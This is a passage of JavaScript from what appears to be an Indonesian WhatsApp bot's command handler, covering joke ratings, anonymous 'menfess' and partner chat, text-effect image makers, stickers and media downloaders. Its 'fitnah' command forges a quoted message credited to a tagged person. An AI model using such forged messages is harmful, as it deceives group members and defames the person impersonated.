let mlove = ['⟪1%⟫','⟪2%⟫','⟪3%⟫','⟪4%⟫','⟪5%⟫','⟪6%⟫','⟪7%⟫','⟪8%⟫','⟪9%⟫','⟪10%⟫','⟪11%⟫','⟪12%⟫','⟪13%⟫','⟪14%⟫','⟪15%⟫','⟪16%⟫','⟪17%⟫','⟪18%⟫','⟪19%⟫','⟪20%⟫','⟪21%⟫','⟪22%⟫','⟪23%⟫','⟪24%⟫','⟪25%⟫','⟪26%⟫','⟪27%⟫','⟪28%⟫','⟪29%⟫','⟪30%⟫','⟪31%⟫','⟪32%⟫','⟪33%⟫','⟪34%⟫','⟪35%⟫','⟪36%⟫','⟪37%⟫','⟪38%⟫','⟪39%⟫','⟪40%⟫','⟪41%⟫','⟪42%⟫','⟪43%⟫','⟪44%⟫','⟪45%⟫','⟪46%⟫','⟪47%⟫','⟪48%⟫','⟪49%⟫','⟪50%⟫','⟪51%⟫','⟪52%⟫','⟪53%⟫','⟪54%⟫','⟪55%⟫','⟪56%⟫','⟪57%⟫','⟪58%⟫','⟪59%⟫','⟪60%⟫','⟪61%⟫','⟪62%⟫','⟪63%⟫','⟪64%⟫','⟪65%⟫','⟪66%⟫','⟪67%⟫','⟪68%⟫','⟪69%⟫','⟪70%⟫','⟪71%⟫','⟪72%⟫','⟪73%⟫','⟪74%⟫','⟪75%⟫','⟪76%⟫','⟪77%⟫','⟪78%⟫','⟪79%⟫','⟪80%⟫','⟪81%⟫','⟪82%⟫','⟪83%⟫','⟪84%⟫','⟪85%⟫','⟪86%⟫','⟪87%⟫','⟪88%⟫','⟪89%⟫','⟪90%⟫','⟪91%⟫','⟪92%⟫','⟪93%⟫','⟪94%⟫','⟪95%⟫','⟪96%⟫','⟪97%⟫','⟪98%⟫','⟪99%⟫','⟪100%⟫']
let mcinta = mlove[Math.floor(Math.random() * mlove.length)]
let jawab = (`*Sebesar : ${mcinta} Padanya*`)
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '❤' }, type: 1 }]
gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: [m.sender], quoted: fkontak})
}
break
case 'daurulang': {
let mdaur = ['♳','♴','♵','♶','♷','♸','♹','♺']
let mulng = mdaur[Math.floor(Math.random() * mdaur.length)]
let jawab = (`*Telah Di Daur Ulang Sebanyak : ${mulng}*`)
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '♻️' }, type: 1 }]
gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: [m.sender], quoted: fkontak})
}
break
case 'dadu': {
let ddsa = ['⚀','⚁','⚂','⚃','⚄','⚅']
let klow = ddsa[Math.floor(Math.random() * ddsa.length)]
m.reply(klow)
}
break
case 'rate': case 'nilai': {
const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const te = ra[Math.floor(Math.random() * ra.length)]
gans.sendMessage(m.chat, { text: `Rate Bot : *${te}%*` }, { quoted: m })
}
break
case 'ganteng': case 'gantengcek': case 'handsome': case 'handsomecheck': {
 if (!text) return replay(`Tag Someone, Example : ${prefix + command} Naze`)
const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const te = ra[Math.floor(Math.random() * ra.length)]
gans.sendMessage(m.chat, { text: `Cek Ganteng : ${text}\nRate Bot : *${te}%*` }, { quoted: m })
}
break
case 'cantik': case 'cantikcek': case 'beautiful': case 'beautifulcheck': {
if (!text) return replay(`Tag Someone, Example : ${prefix + command} Naze`)
const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const te = ra[Math.floor(Math.random() * ra.length)]
gans.sendMessage(m.chat, { text: `Cek Cantik : ${text}\nRate Bot : *${te}%*` }, { quoted: m })
}
break
case 'tanyakerang': case 'kerangajaib': case 'kerang': {
if (!text) throw `Example : ${prefix + command} saya menang?`
let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
let koh = krng[Math.floor(Math.random() * krng.length)]
let jawab = `*${command} ${text}*\n*Jawab : ${koh}*`
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {quoted: floc})
}
break
case 'fitnah': {
if (args.length < 1) return reply(`Usage :\n${prefix}fake [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fake 0|hai|hai juga markenlin`)
var gh = body.slice(10)
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
var parti = gh.split("|")[0];
var targetq = gh.split("|")[1];
var bot = gh.split("|")[2];
var ftelo = {key: {fromMe: false, participant: `${mentioned}`, ...(m.chat ? { remoteJid: m.chat } : {})}, message: { conversation: `${targetq}` }}
gans.sendMessage(m.chat, {text: bot}, {quoted: ftelo})
}
break

//Menfess/Anonymous
case 'menfes': case 'menfess': {
if (m.isGroup) throw ('fitur tidak dapat digunakan di grup')
if (!text) throw `Example : ${prefix + command} 6282xxxxx|nama samaran|pesan`
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: 'Lokasimu', jpegThumbnail: thumb}}}
let mq1 = m1 + '@s.whatsapp.net'
let kawk = ('Ciee ada yang ngirim pesan nih\n© 𝕰𝖗𝖎𝖈𝕯𝖊𝖛')
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let ments = [mq1, ownernya, me]
let ivg = `https://telegra.ph/file/11ad4ee7a5b6fd2d5fcfa.jpg`
let pjtxt = `Hai kak ada Menfess nih!!\n─────────────\n*GansBotz*\n─────────────\n\nDari : _${m2}_ \nPesan : _${m3}_`
let buttons = [
{ buttonId: '.chatwith2 ${sender.replace("@s.whatsapp.net", "")}', buttonText: { displayText: 'Balas Menfes' }, type:1 },
{ buttonId: 'menfess', buttonText: { displayText: 'Kirim Menfesmu' }, type: 1 }]
let but = [{ buttonId: 'menfess', buttonText: { displayText: 'kirim menfes lg' }, type: 1 }]
await gans.sendMessage(m1 + '@s.whatsapp.net', { caption: pjtxt, location: { jpegThumbnail: await reSize(ivg, 300, 200)}, buttons, footer: `Ciee ada yang ngirim pesan nih\n© GansBOTz`}, {quoted: ftroli})
let akhji = `Pesan Telah Terkirim\nKe @${mq1.split('@')[0]}`
await gans.sendButtonText(m.chat, but, akhji, nyoutube, m, {mentions: ments})
}
break
case 'menfesconfirm': {
gans.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🤭`})
 m.reply(`Terimakasih Menfess Telah Diterima.`)
}
break
case 'chatwith2': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
gans.sendMessage(q+'@s.whatsapp.net', {text: `Sudah Di Confirmasi Nih Menfess nyaa ntar lagi dia balas🤭`})
if(!q) return m.reply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return m.reply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: q+'@s.whatsapp.net',
state: "CHATTING",
expired: "5m"
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
m.reply(`Silahkan membalas menfess dengan ketik sesuatu maka bot akan otomatis meneruskan chat kamu ke pengirim menfes\nDan ketika pengirim menfes membalas chat kamu bot juga akan meneruskannya\nUntuk berhenti membalas ketik ${prefix}stopmenfes.`)
}
break
case 'stopmenfes': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){
await gans.sendMessage(roomA.b, {text:" Yah dia telah meninggalkan chat Menfes"})
await setTimeout(() => {
reply("Kamu telah keluar dari Menfes")
roomA.a = roomA.b
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))  
},1000)
} else if(roomA && roomA.state == "WAITING"){
m.reply("Kamu telah keluar dari Menfes")
anonChat.splice(anonChat.indexOf(roomA, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else if(roomB && roomB.state == "CHATTING"){
await gans.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
m.reply("Kamu telah keluar dari Menfes dan meninggalkan nya") 
roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else m.reply(`Kamu sedang tidak ada menfes`)
}
break
case 'confes':
			case 'confess':
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${command} nomer|pengirim|pesan\n\nContoh ${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
let nomor = q.split('|')[0] ? q.split('|')[0] : q
let saking = q.split('|')[1] ? q.split('|')[1] : q
let pesan = q.split('|')[2] ? q.split('|')[2] : ''
let mq1 = nomor + '@s.whatsapp.net'
if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai kak ada Menfess nih!!\n─────────────\n*NoxyBotz*\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
header = 'hayyy'
gambar = `https://telegra.ph/file/11ad4ee7a5b6fd2d5fcfa.jpg`

let buttons = [
{ buttonId: { displayText: `Balas Menfes`, id: `${prefix}chatwith2 ${sender.replace("@s.whatsapp.net", "")}` } },
    { buttonId: { displayText: `Kirim Menfesmu`, id: `${prefix}menfess` } }
		]
gans.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: gambar, buttons, footer: `Ciee ada yang ngirim pesan nih\n© 𝕰𝖗𝖎𝖈𝕯𝖊𝖛` })
m.reply(`Sukses Mengirim Menfess!!`)
break
case 'anonymous': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
gans.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await gans.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, gans.user.name, m)
}
break
case 'keluar': case 'leave': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
    ]
await gans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
throw false
}
m.reply('Ok')
let other = room.other(m.sender)
if (other) await gans.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete this.anonymous[room.id]
if (command === 'leave') break
}
case 'mulai': case 'start': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
    let buttons = [
        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
    ]
await gans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, gans.user.name, m)
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
    ]
await gans.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, gans.user.name, m)
    room.b = m.sender
    room.state = 'CHATTING'
await gans.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, gans.user.name, m)
} else {
let id = + new Date
this.anonymous[id] = {
        id,
        a: m.sender,
        b: '',
        state: 'WAITING',
        check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await gans.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, gans.user.name, m)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
await gans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
    throw false
}
let other = romeo.other(m.sender)
if (other) await gans.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await gans.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, gans.user.name, m)
room.b = m.sender
room.state = 'CHATTING'
await gans.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, gans.user.name, m)
} else {
let id = + new Date
this.anonymous[id] = {
        id,
        a: m.sender,
        b: '',
        state: 'WAITING',
        check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await gans.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, gans.user.name, m)
}
}
break

//Tempatny Maker
case 'carbon': {
if (!text) throw 'No Query Text'
m.reply(mess.wait)
gans.sendMessage(m.chat, { image: { url: `https://api-rull.herokuapp.com/api/cmd?code=${text}` }, caption: `Nih Bro` }, { quoted: m })
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas':
case 'sparklechristmas': 
case 'holographic':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'karbon': 
case 'colorneon': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case '3dbox': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'greenneon': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'lion2': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike': 
case '3davengers': 
case 'snow': 
case 'cloud':
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'whitebear': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!q) return reply(`Example : ${prefix + command} ${global.ownername}`) 
m.reply(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/colorneon/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/greenneon/.test(command)) link = 'https://textpro.me/green-neon-text-effect-874.html'
if (/lion2/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/karbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
gans.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname}` }, { quoted: fkontak })
}
break
case 'glitch2': 
case 'harrypot': 
case 'graffiti': 
case 'pornhub': 
case 'glitch3': 
case '3dspace': 
case 'lion': 
case 'wolf': 
case 'retro': 
case '8bit': {
if(!text) return m.reply(`Use ${prefix + command} text1|text2`)
m.reply(mess.wait)
             teks1 = q.split("|")[0]
             teks2 = q.split("|")[1]
let link
if (/glitch3/.test(command)) link = 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html'
if (/harrypot/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/graffiti/.test(command)) link = 'https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html'
if (/pornhub/.test(command)) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
if (/glitch2/.test(command)) link = 'https://textpro.me/create-a-glitch-text-effect-online-free-1026.html'
if (/3dspace/.test(command)) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
if (/lion/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
if (/wolf/.test(command)) link = 'https://textpro.me/create-wolf-logo-galaxy-online-936.html'
if (/retro/.test(command)) link = 'https://textpro.me/create-3d-retro-text-effect-online-free-1065.html'
if (/8bit/.test(command)) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
let anu = await maker.textpro(link, [`${teks1}`,`${teks2}`])
gans.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname}` }, { quoted: fkontak })
}
break

//convert
case 'smeme':
case 'stikermeme':
case 'stickermeme':
case 'memestiker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var atas = q.split('|')[0]
var bawah = q.split('|')[1]
if (!atas) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (!bawah) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (isImage || isQuotedImage){
reply(mess.wait)
var media = await gans.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
var opt = { packname: 'Gurbot MD', author: 'By Lexxy' }
gans.sendImageAsSticker(from, meme_url, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
}
break
case 'swm':
case 'stikerwm':
case 'stickerwm':
case 'takesticker':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
var pname = q.split('|')[0]
var athor = q.split('|')[1]
reply(mess.wait)
if (isImage || isQuotedImage){
await gans.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var opt = { packname: pname, author: athor }
gans.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else if (isVideo || isQuotedVideo) {
reply(mess.wait)
var media = await gans.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
gans.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) throw `*Balas Video/Image Dengan Caption* ${prefix + command}`
m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await gans.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maksimal 10 detik!*')
let media = await quoted.download()
let encmedia = await gans.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `*Kirim Gambar/Video Dengan Caption* ${prefix + command}\nDurasi *Video 1-9 Detik*`
                }
            }
break

//Downloader
case 'tiktok':{
if (!args[0]) throw `Use example ${command} https://www.tiktok.com/@omagadsus/video/7025456384175017243`
m.reply('Mohon Ditunggu yah Bro')
    const { author: { nickname }, video, description } = await tiktokdl(args[0])
    .catch(async _ => await tiktokdlv2(args[0]))
        .catch(async _ => await tiktokdl(args[0]))
    const url = video.no_watermark || video.no_watermark2 || video.no_watermark_raw
    if (!url) throw 'Can\'t download video!'
    let buttons = [
{buttonId: `${prefix}ttad ${args[0]}}`, buttonText: {displayText: 'Audio'}, type: 1}
]
let buttonMessage = {
video: {url:url},
caption: `nah`,
footer: titlebot,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"  Tiktok Downloader",
body:titlebot,
thumbnail: virgam,
mediaType:1,
mediaUrl: args[0],
sourceUrl: args[0]
}}
}
gans.sendMessage(m.chat, buttonMessage, {quotes:m})
}
break
case 'ttad': {
let res = await aiovideodl(args[0])
gans.sendMessage(from, {audio:{url:res.medias[2].url}, mimetype:"audio/mp4", ptt:true, contextInfo:{externalAdReply:{
title:"  Tiktok Downloader",
body:res.title,
thumbnail: virgam,
mediaType:1,
mediaUrl: args[0],
sourceUrl: args[0]
}}}, {quoted:m})
}
break
case 'play': {
if (!text) throw 'Input Query'
let vid = (await youtubeSearch(text)).video[0]
if (!vid) throw 'Video/Audio Tidak Ditemukan'
let { title, description, thumbnail, videoId, durationH, durationS, viewH, publishedTime } = vid
let url = 'https://www.youtube.com/watch?v=' + videoId
let ytLink = `https://yt-downloader.akkun3704.repl.co/?url=${url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
let capt = `*Title:* ${title}\n*Published:* ${publishedTime}\n*Duration:* ${durationH}\n*Views:* ${viewH}\n*Url:* ${url}`
let buttons = [{ buttonText: { displayText: 'Video' }, buttonId: `ytv ${url}` },
{ buttonText: { displayText: 'Audio' }, buttonId: `yta ${url}` }]
let msg = await gans.sendMessage(m.chat, { image: { url: thumbnail }, caption: capt, footer: `_${titlebot}_`, buttons }, { quoted: m })
}
break
case 'yta': case 'ytmp3': case 'ytaudio': {
if (!args[0]) throw `Mana link nya`
let vid = (await youtubeSearch(text)).video[0]
